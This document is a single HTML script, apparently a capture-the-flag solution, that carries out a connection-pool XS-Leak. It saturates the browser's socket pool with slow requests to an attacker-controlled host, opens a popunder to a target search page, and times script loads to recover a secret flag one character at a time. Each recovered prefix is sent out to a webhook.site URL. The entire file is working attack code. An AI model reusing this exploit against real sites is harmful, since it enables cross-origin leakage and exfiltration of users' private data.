<script>

    /*

    Connection Pool XS-Leak with requests priority
    
    */
    LOG = 'Starting'
    SOCKETLIMIT = 255;
    TIMELIMIT = 800;
    INSTANCE = 'localhost:1337'
    MYSERVER = `sleep.xxxxxxxx.it`
    
    let res = null;
    let flag = "flag{"; // flag{fake_flag}

    const sleep = (ms) => {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
    
    const fetch_sleep_long = (i) => {
        controller = new AbortController();
        const signal = controller.signal;
        
        fetch(`http://${i}.${MYSERVER}/40sleep?q=${i}`, {
            mode: 'no-cors',
            signal: signal
        });

        return controller
    }
    

    const load_async_script = (i) => {
        const start = performance.now();
        let s = document.createElement("script");
        s.type = "text/javascript";
        s.src = `http://${i}.${MYSERVER}/0?q=${i}&data=${Math.random()}`;
        s.async = true;

        s.onload = (e) => {
            res = performance.now() - start;
            document.body.removeChild(s);
        }

        document.body.append(s);
    };
    
    const block_socket = async (i) => {
        fetch_sleep_long(i);
        await sleep(0);
    }
    
    const exhaust_sockets = async() => {
        let i = 0
        for (; i < SOCKETLIMIT; i++) {
            block_socket(i);
        }
        console.log(`Used ${i} connections`);
    }
    
    const timeit = async (url, popup) => {
        return new Promise(async (r) => {
            try{
                popup.location = url;
        
                let controller_blocker = await fetch_sleep_long(1337);
                await sleep(50);
                await load_async_script(1);

                await sleep(100);
                controller_blocker.abort();
                let cont1 = await fetch_sleep_long(1337);

                await sleep(500);
                cont1.abort();
            }catch(e){ }

            await sleep(500);
            r([res])
        });
    }
    
    const alphabet = '_abcdefghijklmnopqrstuvwxyz}'.split('');
    
    const oracle = async (search) => {
        let url = `http://${INSTANCE}/search?query=${search}`
        let t = await timeit(url, WINBG)
   
        return t;
    }

    const popunder = () => {
        if (window.opener){
                WINBG = window.opener
        }else{
            WINBG = window.open(location.href, target="_blank")
            location = `about:blank`
        }
    }
    

    async function main(){
        popunder();
        exhaust_sockets();

        await sleep(100);

        while(1){
            for(let i = 0; i < alphabet.length; i++){
                let t = await oracle(flag + alphabet[i]);
                console.log(flag + alphabet[i], t)
                if(t > 500){
                    console.log("OK");
                    flag = flag + alphabet[i];
                    await fetch("https://webhook.site/b85ec99b-b26a-4717-9ef0-e01ff9ac6e47?flag=" + flag, {mode: "no-cors"})
                    break;
                }
            }
        }
    }

    main();
    
    
    </script>
